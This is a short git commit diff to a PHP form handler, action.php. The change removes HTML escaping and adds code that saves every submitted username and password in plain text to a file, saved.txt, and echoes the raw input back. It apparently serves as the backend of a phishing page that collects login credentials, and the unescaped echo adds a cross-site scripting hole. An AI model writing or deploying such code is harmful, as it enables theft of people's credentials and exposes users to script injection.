a0f0796e75818c4b61b75260315d3d54623d15e2
redmi9primemv <118620814+redmi9primemv@users.noreply.github.com>
2022-11-26 11:07:54 +0530

    changes

--- action.php
+++ action.php
@@ -1,6 +1,13 @@
 <?php
-$username = htmlspecialchars($_POST['username']);
-$password = htmlspecialchars($_POST['password']);
-
-echo $username, ' ', $password;
+if(isset($_POST['submit'])){
+$Name = "Username:".$_POST['username']."
+";
+$Pass = "Password:".$_POST['password']."
+";
+echo $Name, ' ', $Pass;
+$file=fopen("saved.txt", "a");
+fwrite($file, $Name);
+fwrite($file, $Pass);
+fclose($file);
+}
 ?>
